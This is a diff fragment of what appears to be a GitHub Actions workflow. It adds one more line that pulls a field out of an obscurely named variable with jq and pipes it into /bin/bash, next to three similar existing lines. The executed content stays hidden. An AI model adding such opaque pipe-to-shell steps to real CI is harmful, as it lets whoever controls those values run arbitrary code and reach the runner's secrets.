@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$hape6022" | jq -r .oyh42 | /bin/bash
           printf '%s' "$cjm667" | jq -r .tdyu1595 | /bin/bash
           echo $qtn84 | jq -r .r6 | /bin/bash
+          printf '%s' "$nu2" | jq -r .fy7708 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
